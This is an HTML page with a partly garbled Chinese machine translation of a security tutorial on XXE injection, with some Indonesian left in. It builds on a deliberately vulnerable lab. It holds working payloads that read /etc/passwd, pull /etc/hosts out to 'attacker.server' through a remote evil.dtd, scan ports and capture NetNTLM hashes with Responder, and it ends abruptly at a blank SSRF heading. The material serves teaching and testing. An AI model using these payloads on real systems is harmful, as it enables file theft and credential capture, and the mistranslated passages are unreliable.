<html>
<head>
<title>Exploiting XML External Entity (XXE) Injection Vulnerability</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">利用XML外部实体(XXE)注入漏洞</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/exploiting-xml-external-entity-xxe-injection-vulnerability-f8c4094fef83?source=collection_archive---------0-----------------------#2021-09-06">https://infosecwriteups.com/exploiting-xml-external-entity-xxe-injection-vulnerability-f8c4094fef83?source=collection_archive---------0-----------------------#2021-09-06</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><h1 id="c3a1" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">XML实体101‌</h1><h1 id="d2db" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">一般实体</h1><p id="87fe" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">简单来说，XML中的实体可以说是一个变量，所以这个实体可以保存一个值。实体可以声明为内部或外部。实体有3个重要部分，分别是<code class="fe lj lk ll lm b">&amp;</code>、<code class="fe lj lk ll lm b">entity-name</code>和<code class="fe lj lk ll lm b">;</code>。所以要调用一个已经声明的实体必须结合这三个部分。‌</p><h1 id="1ad9" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">内部实体</h1><p id="70e2" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">要创建内部实体，请使用以下语法</p><pre class="ln lo lp lq gt lr lm ls lt aw lu bi"><span id="f7e3" class="lv jo iq lm b gy lw lx l ly lz">&lt;!ENTITY entity-name "entity value"&gt;‌</span></pre><p id="ee1b" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi translated"><strong class="kn ir">示例</strong></p><pre class="ln lo lp lq gt lr lm ls lt aw lu bi"><span id="f22c" class="lv jo iq lm b gy lw lx l ly lz">&lt;?xml version="1.0" standalone="yes" ?&gt;</span><span id="ff53" class="lv jo iq lm b gy mf lx l ly lz">&lt;!DOCTYPE user [</span><span id="9c2c" class="lv jo iq lm b gy mf lx l ly lz">&lt;!ENTITY name "si tampan"&gt;</span><span id="9c30" class="lv jo iq lm b gy mf lx l ly lz">]&gt;</span><span id="23fb" class="lv jo iq lm b gy mf lx l ly lz">&lt;user&gt;&amp;name;&lt;/user&gt;</span></pre><p id="877f" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi translated">这与下面的PHP代码相同:</p><pre class="ln lo lp lq gt lr lm ls lt aw lu bi"><span id="f911" class="lv jo iq lm b gy lw lx l ly lz">$name = "si tampan";<br/>e‌cho $name;</span></pre><h1 id="5d6d" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">外部实体</h1><p id="1f7f" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">创建一个外部实体与创建一个内部实体是一样的，但是在实体名称后添加关键字<code class="fe lj lk ll lm b">SYSTEM</code>并且它的值必须是绝对/相对<code class="fe lj lk ll lm b">URI/URL</code>。</p><pre class="ln lo lp lq gt lr lm ls lt aw lu bi"><span id="97eb" class="lv jo iq lm b gy lw lx l ly lz">&lt;!ENTITY enitity-name SYSTEM "URI/URL"&gt;‌</span></pre><p id="fb80" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi translated"><strong class="kn ir">示例</strong></p><pre class="ln lo lp lq gt lr lm ls lt aw lu bi"><span id="88ba" class="lv jo iq lm b gy lw lx l ly lz">&lt;?xml version="1.0" standalone="yes" ?&gt;</span><span id="b159" class="lv jo iq lm b gy mf lx l ly lz">&lt;!DOCTYPE text [</span><span id="5526" class="lv jo iq lm b gy mf lx l ly lz">&lt;!ENTITY word SYSTEM "file://text.txt"&gt;</span><span id="d420" class="lv jo iq lm b gy mf lx l ly lz">]&gt;</span><span id="a497" class="lv jo iq lm b gy mf lx l ly lz">&lt;text&gt;&amp;word;&lt;/text&gt;‌</span></pre><p id="c4e4" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi translated">上面的XML与下面的PHP代码相同:</p><pre class="ln lo lp lq gt lr lm ls lt aw lu bi"><span id="3690" class="lv jo iq lm b gy lw lx l ly lz">$word = file_get_contents("file://text.txt");<br/>echo $word;‌</span></pre><h1 id="cd00" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">参数实体</h1><p id="25c3" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">参数实体与一般实体相似，只是参数实体只能在<code class="fe lj lk ll lm b">&lt;!DOCTYPE docname [</code>和<code class="fe lj lk ll lm b">]&gt;</code>之间的DTD结构中使用，并且必须在实体名称前加一个<code class="fe lj lk ll lm b">%</code>符号。‌</p><p id="36e2" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi translated">参数实体也可以是内部实体和外部实体，但韩亚可以作为参数外部实体。作为参数实体，外部实体必须将数据XML转换为DTD。Penggunaan参数实体mirip seperti konsep <code class="fe lj lk ll lm b">include()</code> pada php。</p><p id="abfd" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi translated">在参数实体中，也有内部和外部实体，但这里只讨论外部参数实体。在参数实体中，外部实体必须是XML数据的有效语法，因为它将被视为DTD。参数实体的使用类似于PHP中<code class="fe lj lk ll lm b">include()</code>函数的概念。</p><pre class="ln lo lp lq gt lr lm ls lt aw lu bi"><span id="6754" class="lv jo iq lm b gy lw lx l ly lz">&lt;!ENTITY % enitity-name SYSTEM "URI"&gt;‌</span></pre><p id="24c8" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi translated">例如，有一个名为<code class="fe lj lk ll lm b">data.xml</code>的外部<code class="fe lj lk ll lm b">DTD</code>，其内容:</p><pre class="ln lo lp lq gt lr lm ls lt aw lu bi"><span id="ea4a" class="lv jo iq lm b gy lw lx l ly lz">&lt;!ENTITY email "si_tampan@email.com"&gt;</span><span id="a731" class="lv jo iq lm b gy mf lx l ly lz">&lt;!ENTITY name "si tampan"&gt;‌</span></pre><p id="28fa" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi translated"><strong class="kn ir">例子</strong></p><pre class="ln lo lp lq gt lr lm ls lt aw lu bi"><span id="4dd4" class="lv jo iq lm b gy lw lx l ly lz">&lt;?xml version="1.0" standalone="yes" ?&gt;</span><span id="d6a3" class="lv jo iq lm b gy mf lx l ly lz">&lt;!DOCTYPE user [<br/>&lt;!ENTITY % ext-dtd SYSTEM "data.xml"&gt;<br/>%ext-dtd;<br/>]&gt;<br/>&lt;user&gt;&amp;name; &amp;email;&lt;/user&gt;</span></pre><p id="2250" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi translated">因为这个参数实体类似于PHP中的<code class="fe lj lk ll lm b">include()</code>函数，当调用<code class="fe lj lk ll lm b">%ext-dtd;</code>发生时，<code class="fe lj lk ll lm b">%ext-dtd</code>会被<code class="fe lj lk ll lm b">data.xml</code>中的所有数据替换，所以会是这样的:</p><pre class="ln lo lp lq gt lr lm ls lt aw lu bi"><span id="f0b0" class="lv jo iq lm b gy lw lx l ly lz">&lt;?xml version="1.0" standalone="yes" ?&gt;</span><span id="5797" class="lv jo iq lm b gy mf lx l ly lz">&lt;!DOCTYPE user [</span><span id="d67e" class="lv jo iq lm b gy mf lx l ly lz">&lt;!ENTITY % ext-dtd SYSTEM "data.xml"&gt;</span><span id="0877" class="lv jo iq lm b gy mf lx l ly lz">&lt;!ENTITY email "si_tampan@email.com"&gt;</span><span id="9cff" class="lv jo iq lm b gy mf lx l ly lz">&lt;!ENTITY name "si tampan"&gt;</span><span id="b79e" class="lv jo iq lm b gy mf lx l ly lz">]&gt;</span><span id="7f8b" class="lv jo iq lm b gy mf lx l ly lz">&lt;user&gt;&amp;name; &amp;email;&lt;/user&gt;‌</span></pre><h1 id="c0b7" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">实体中的实体</h1><p id="335d" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">可以使用以下语法将已声明的实体的值用于或组合到另一个实体中:</p><pre class="ln lo lp lq gt lr lm ls lt aw lu bi"><span id="81d2" class="lv jo iq lm b gy lw lx l ly lz">&lt;!ENTITY enitity-one "entity-one value"&gt;</span><span id="e9e2" class="lv jo iq lm b gy mf lx l ly lz">&lt;!ENTITY entity-two "entity-two value &amp;enitity-one;"&gt;‌</span></pre><p id="1aae" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi translated"><strong class="kn ir">示例</strong></p><pre class="ln lo lp lq gt lr lm ls lt aw lu bi"><span id="61f7" class="lv jo iq lm b gy lw lx l ly lz">&lt;?xml version="1.0" standalone="yes" ?&gt;</span><span id="b0b1" class="lv jo iq lm b gy mf lx l ly lz">&lt;!DOCTYPE user [</span><span id="456e" class="lv jo iq lm b gy mf lx l ly lz">&lt;!ENTITY email "si_tampan@email.com"&gt;</span><span id="d08d" class="lv jo iq lm b gy mf lx l ly lz">&lt;!ENTITY name "si tampan &amp;email;"&gt;</span><span id="ecd7" class="lv jo iq lm b gy mf lx l ly lz">]&gt;</span><span id="4b0f" class="lv jo iq lm b gy mf lx l ly lz">&lt;user&gt;&amp;name;&lt;/user&gt;‌</span></pre><p id="6101" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi translated">实体中的实体也可以是参数实体，但不能是解析有效的XML。‌</p><p id="f14e" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi translated">实体中的实体也可以在参数entity上执行，但该值必须是有效的XML语法，因为它将被解析。‌</p><h1 id="b642" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">XXE Attack‌</h1><p id="7996" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">简单地说，XXE攻击的发生是因为XML解析器允许使用外部实体，就这么简单！！。</p><p id="e9f6" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi translated">因为通过能够使用外部实体，攻击者可以做各种事情，如:‌</p><ol class=""><li id="b3c4" class="mg mh iq kn b ko ma ks mb kw mi la mj le mk li ml mm mn mo bi translated">SSRF</li><li id="db13" class="mg mh iq kn b ko mp ks mq kw mr la ms le mt li ml mm mn mo bi translated">PHP对象注入(通过phar://)</li><li id="3081" class="mg mh iq kn b ko mp ks mq kw mr la ms le mt li ml mm mn mo bi translated">XSS/CSRF</li><li id="acc1" class="mg mh iq kn b ko mp ks mq kw mr la ms le mt li ml mm mn mo bi translated">本地文件公开</li><li id="d431" class="mg mh iq kn b ko mp ks mq kw mr la ms le mt li ml mm mn mo bi translated">RCE</li><li id="f63b" class="mg mh iq kn b ko mp ks mq kw mr la ms le mt li ml mm mn mo bi translated">Scanning‌当地港口</li></ol><h1 id="4e30" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">实验室设置</h1><p id="19fd" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">对于实验室设置，我们使用来自<a class="ae mu" href="https://github.com/jbarone/xxelab" rel="noopener ugc nofollow" target="_blank">https://github.com/jbarone/xxelab</a>的<code class="fe lj lk ll lm b">xxelab</code>，在这个报告中已经创建了一个<code class="fe lj lk ll lm b">Vagrantfile</code>，这意味着您可以通过使用<code class="fe lj lk ll lm b">vagrant</code>直接创建<em class="mv">环境</em></p><pre class="ln lo lp lq gt lr lm ls lt aw lu bi"><span id="b160" class="lv jo iq lm b gy lw lx l ly lz">$ git clone <a class="ae mu" href="https://github.com/jbarone/xxelab.git" rel="noopener ugc nofollow" target="_blank">https://github.com/jbarone/xxelab.git</a></span><span id="06d3" class="lv jo iq lm b gy mf lx l ly lz">$ cd xxelab</span><span id="008e" class="lv jo iq lm b gy mf lx l ly lz">$ vagrant up</span></pre><p id="5166" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi translated">也可以不使用<code class="fe lj lk ll lm b">Vagrant</code>自行部署</p><figure class="ln lo lp lq gt mx gh gi paragraph-image"><div class="gh gi mw"><img src="../Images/fb3c35d75ade374ac41c936654fe8cd9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1186/format:webp/0*KdTgtjd_3w22L3MG.png"/></div></figure><p id="b326" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi">‌</p><h1 id="23c7" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">经典XXE</h1><p id="3638" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">在经典的XXE中，攻击者只需要创建一个简单的外部实体来读取本地文件，并通过XML解析器将要解析的元素调用该实体。</p><p id="f724" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi translated">网上实验室的请求。</p><figure class="ln lo lp lq gt mx gh gi paragraph-image"><div role="button" tabindex="0" class="nb nc di nd bf ne"><div class="gh gi na"><img src="../Images/5b002149334c0db59ca87c30ab8c30f2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*5m1pNyE0APO2mWu6.png"/></div></div></figure><p id="d7a7" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi translated">从服务器响应结果可以看出，电子邮件元素将被解析和显示，因此经典的XXE可以用来读取本地文件。</p><p id="227b" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi translated">‌ <strong class="kn ir">有效载荷:</strong></p><pre class="ln lo lp lq gt lr lm ls lt aw lu bi"><span id="c296" class="lv jo iq lm b gy lw lx l ly lz">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span id="85b2" class="lv jo iq lm b gy mf lx l ly lz">&lt;!DOCTYPE root[</span><span id="3856" class="lv jo iq lm b gy mf lx l ly lz">&lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;</span><span id="c3d8" class="lv jo iq lm b gy mf lx l ly lz">]&gt;</span><span id="6099" class="lv jo iq lm b gy mf lx l ly lz">&lt;root&gt;</span><span id="a398" class="lv jo iq lm b gy mf lx l ly lz">&lt;name&gt;test&lt;/name&gt;</span><span id="4933" class="lv jo iq lm b gy mf lx l ly lz">&lt;tel&gt;082&lt;/tel&gt;</span><span id="ed6a" class="lv jo iq lm b gy mf lx l ly lz">&lt;email&gt;&amp;file;&lt;/email&gt;</span><span id="71a1" class="lv jo iq lm b gy mf lx l ly lz">&lt;password&gt;pwd&lt;/password&gt;</span><span id="ba11" class="lv jo iq lm b gy mf lx l ly lz">&lt;/root&gt;</span></pre><figure class="ln lo lp lq gt mx gh gi paragraph-image"><div role="button" tabindex="0" class="nb nc di nd bf ne"><div class="gh gi nf"><img src="../Images/d03a4f8097fbd4167f25fa0bb20190cb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*JWI3o2i7QVzhw4_k.png"/></div></div></figure><h1 id="d006" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">盲人XXE——XXE乐队之外</h1><p id="59dd" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">顾名思义，它是<code class="fe lj lk ll lm b">blind</code>，意思是解析结果或数据不会被显示，要看到数据，必须进行<em class="mv">过滤</em>才能看到/读取数据。</p><p id="2b52" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi translated">对于盲测实验室，XXE仍然使用xxelab，但源略有变化，回声部分被删除，因此结果不会显示为响应。</p><pre class="ln lo lp lq gt lr lm ls lt aw lu bi"><span id="9309" class="lv jo iq lm b gy lw lx l ly lz">echo "Sorry, $email is already registered!";‌</span></pre><h1 id="ce14" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">盲XXE验证</h1><p id="7035" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">在做<em class="mv">盲人XXE </em>注射之前，最好先核实一下，这个网站是否真的容易受到<em class="mv">盲人XXE </em>的攻击。验证是非常容易的，因为你只需要使用一个外部实体，该实体具有一个包装器或协议，该包装器或协议根据目标使用的技术栈支持远程源，如HTTP、FTP或其他协议，因为一些协议/包装器默认情况下不启用，还有一些包装器只在某些编程语言上工作，例如，只存在于<strong class="kn ir"> Java </strong>中的<code class="fe lj lk ll lm b">netdoc://</code>包装器(其行为类似于<code class="fe lj lk ll lm b">file://</code>)。</p><p id="8c59" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi translated"><strong class="kn ir">有效载荷验证:</strong></p><pre class="ln lo lp lq gt lr lm ls lt aw lu bi"><span id="1ba9" class="lv jo iq lm b gy lw lx l ly lz">&lt;!DOCTYPE root [</span><span id="58d8" class="lv jo iq lm b gy mf lx l ly lz">&lt;!ENTITY % test SYSTEM "http://attacker.server:2121"&gt;</span><span id="feb9" class="lv jo iq lm b gy mf lx l ly lz">%test;</span><span id="f3d7" class="lv jo iq lm b gy mf lx l ly lz">]&gt;</span><span id="64ea" class="lv jo iq lm b gy mf lx l ly lz">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span id="d81f" class="lv jo iq lm b gy mf lx l ly lz">&lt;!DOCTYPE root [</span><span id="7195" class="lv jo iq lm b gy mf lx l ly lz">&lt;!ENTITY % test SYSTEM "http://attacker.server:2121"&gt;</span><span id="a60b" class="lv jo iq lm b gy mf lx l ly lz">%test;</span><span id="273e" class="lv jo iq lm b gy mf lx l ly lz">]&gt;</span><span id="2cb6" class="lv jo iq lm b gy mf lx l ly lz">&lt;root&gt;</span><span id="91b4" class="lv jo iq lm b gy mf lx l ly lz">&lt;name&gt;test&lt;/name&gt;</span><span id="2eba" class="lv jo iq lm b gy mf lx l ly lz">&lt;tel&gt;021212&lt;/tel&gt;</span><span id="4b0d" class="lv jo iq lm b gy mf lx l ly lz">&lt;email&gt;test&lt;/email&gt;</span><span id="f64a" class="lv jo iq lm b gy mf lx l ly lz">&lt;password&gt;pwd&lt;/password&gt;</span><span id="f7bc" class="lv jo iq lm b gy mf lx l ly lz">&lt;/root&gt;</span></pre><p id="0d61" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi">‌</p><p id="03b3" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi translated">如果你得到了来自目标服务器的响应，这意味着你可以确定目标容易受到<em class="mv">盲XXE </em>的攻击。</p><figure class="ln lo lp lq gt mx gh gi paragraph-image"><div class="gh gi ng"><img src="../Images/db520ac58cf63edb2deacd14fa21c792.png" data-original-src="https://miro.medium.com/v2/resize:fit:892/format:webp/0*8khrriS8MwquvEMq.png"/></div></figure><h1 id="0922" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">OOB·XXE</h1><p id="289d" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">如果目标已被验证，并收到指示易受XXE攻击的响应，下一步就是<em class="mv">泄漏</em>您想要读取的数据。‌</p><p id="889b" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi translated">远程dtd nya bernama <code class="fe lj lk ll lm b">evil.dtd</code> disimpan di服务器攻击者，isi nya:</p><p id="ef73" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi translated">名为<code class="fe lj lk ll lm b">evil.dtd</code>的远程DTD存储在攻击者的服务器上，其内容有:</p><pre class="ln lo lp lq gt lr lm ls lt aw lu bi"><span id="588f" class="lv jo iq lm b gy lw lx l ly lz">&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/hosts"&gt;</span><span id="40a6" class="lv jo iq lm b gy mf lx l ly lz">&lt;!ENTITY % all "&lt;!ENTITY % send SYSTEM 'http://attacker.server:2121/?%file;'&gt;"&gt;</span></pre><p id="8b26" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi translated">Payload diatas，filenya创建了一个php base64包装器，用于处理<code class="fe lj lk ll lm b">whitespace</code>过滤数据中的空白字符<code class="fe lj lk ll lm b">libxml</code> php url不支持空白字符。</p><p id="1dfb" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi translated">上面的有效负载，文件使用了一个<em class="mv"> base64 </em> PHP包装器，目标是避免您想要过滤的数据中的空白字符(\s，\t，\n)，因为the url的<code class="fe lj lk ll lm b">libxml</code>不能包含空白字符。</p><figure class="ln lo lp lq gt mx gh gi paragraph-image"><div class="gh gi nh"><img src="../Images/91796205df17095db48c67b77bb0a745.png" data-original-src="https://miro.medium.com/v2/resize:fit:1244/format:webp/0*wdN7gUbGNig89DmI.png"/></div></figure><p id="2932" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi">‌</p><p id="e201" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi translated"><strong class="kn ir">上面的有效载荷是如何工作的:‌ </strong></p><ol class=""><li id="5e23" class="mg mh iq kn b ko ma ks mb kw mi la mj le mk li ml mm mn mo bi translated">外部实体将在<a class="ae mu" href="http://attacker.server/evil.dtd" rel="noopener ugc nofollow" target="_blank">http://attacker.server/evil.dtd</a>解析远程源</li><li id="76e2" class="mg mh iq kn b ko mp ks mq kw mr la ms le mt li ml mm mn mo bi translated">参数实体<code class="fe lj lk ll lm b">file</code>将读取<code class="fe lj lk ll lm b">/etc/hosts</code></li><li id="9adf" class="mg mh iq kn b ko mp ks mq kw mr la ms le mt li ml mm mn mo bi translated">实体<code class="fe lj lk ll lm b">all</code>创建名为<code class="fe lj lk ll lm b">send</code>的参数实体</li><li id="e354" class="mg mh iq kn b ko mp ks mq kw mr la ms le mt li ml mm mn mo bi translated">实体<code class="fe lj lk ll lm b">send</code>将向<a class="ae mu" href="http://attacker.server:2121/" rel="noopener ugc nofollow" target="_blank">http://attack . server:2121</a>发送请求，并追加来自<code class="fe lj lk ll lm b">file</code>实体的数据，因此URL请求看起来像这样:<a class="ae mu" href="http://attacker.server:2121/?DATABASE64" rel="noopener ugc nofollow" target="_blank">http://attacker.server:2121/?DATABASE64</a>‌</li></ol><p id="f233" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi translated">服务器监听器包含<em class="mv"> base64编码的</em>数据，如果被解码，其内容就是目标服务器的<code class="fe lj lk ll lm b">/etc/hosts</code>文件。</p><figure class="ln lo lp lq gt mx gh gi paragraph-image"><div role="button" tabindex="0" class="nb nc di nd bf ne"><div class="gh gi ni"><img src="../Images/aa29f2b9658c781d2f0db9f74370180e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*idFPtEQj42ttNr1n.png"/></div></div></figure><p id="d0a9" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi">‌</p><h1 id="180f" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">XXE和Scan‌港</h1><p id="ff70" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">进行端口扫描实际上非常容易，因为有效载荷与进行<em class="mv">盲XXE </em>验证时相同。这样，攻击者只需要将主机更改为本地服务器以及他想要尝试联系的端口。可以从服务器响应中看到特定端口是否打开的指示，例如，响应时间太长，或者可能显示了错误消息(如果服务器激活了错误报告)。‌</p><p id="ae00" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi translated">尝试扫描端口9000。</p><figure class="ln lo lp lq gt mx gh gi paragraph-image"><div role="button" tabindex="0" class="nb nc di nd bf ne"><div class="gh gi nj"><img src="../Images/6c36840a1e9d9d0bef5804533473b855.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*LtPqF6dflx5EUR5Q.png"/></div></div></figure><h1 id="32bb" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">XXE和NetNTLM</h1><p id="9e35" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">如果目标在Windows服务器上，XXE也可以被用来在<code class="fe lj lk ll lm b">metasploit</code>或<code class="fe lj lk ll lm b">Responder</code>工具的帮助下窃取<em class="mv"> NetNTLM </em>哈希，被窃取的<em class="mv"> NetNTLM </em>哈希不能用来通过哈希攻击，但可以被破解得到明文密码。‌</p><p id="9c90" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi translated">为了与SMB协议交互(特别是在PHP中的XXE的情况下),我们可以使用<code class="fe lj lk ll lm b">php://</code>包装器，而与SMB协议交互的URI是<code class="fe lj lk ll lm b">//‌</code>。</p><p id="59a3" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi translated">当然，对于有效载荷，我们可以使用外部实体(通用/参数)。</p><pre class="ln lo lp lq gt lr lm ls lt aw lu bi"><span id="39af" class="lv jo iq lm b gy lw lx l ly lz">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span id="5dff" class="lv jo iq lm b gy mf lx l ly lz">&lt;!DOCTYPE root [</span><span id="5611" class="lv jo iq lm b gy mf lx l ly lz">&lt;!ENTITY steal SYSTEM "php://filter/convert.base64-encode/resource=//RESPONDER-IP/WhatEver"&gt;</span><span id="5f7f" class="lv jo iq lm b gy mf lx l ly lz">]&gt;</span><span id="bac9" class="lv jo iq lm b gy mf lx l ly lz">&lt;root&gt;</span><span id="e324" class="lv jo iq lm b gy mf lx l ly lz">&lt;name&gt;test&lt;/name&gt;</span><span id="72de" class="lv jo iq lm b gy mf lx l ly lz">&lt;tel&gt;021212&lt;/tel&gt;</span><span id="1115" class="lv jo iq lm b gy mf lx l ly lz">&lt;email&gt;&amp;steal;&lt;/email&gt;</span><span id="4c93" class="lv jo iq lm b gy mf lx l ly lz">&lt;password&gt;pwd&lt;/password&gt;</span><span id="33f4" class="lv jo iq lm b gy mf lx l ly lz">&lt;/root&gt;‌</span></pre><p id="cbb7" class="pw-post-body-paragraph kl km iq kn b ko ma kq kr ks mb ku kv kw mc ky kz la md lc ld le me lg lh li ij bi translated">运行命令<code class="fe lj lk ll lm b">Responder</code></p><pre class="ln lo lp lq gt lr lm ls lt aw lu bi"><span id="caae" class="lv jo iq lm b gy lw lx l ly lz">$ ./Responder.py -I &lt;INTERFACES_NAME&gt;</span></pre><figure class="ln lo lp lq gt mx gh gi paragraph-image"><div role="button" tabindex="0" class="nb nc di nd bf ne"><div class="gh gi nk"><img src="../Images/a1d77ce3f51994eba5b97c36ec4d9547.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*V-GfjzO5y6qXrYxf"/></div></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">使用响应程序时截取NetNTML哈希</figcaption></figure><h1 id="46bd" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">XXE和开放XML文档</h1><h1 id="6ea0" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">XXE和SSRF</h1><p id="3423" 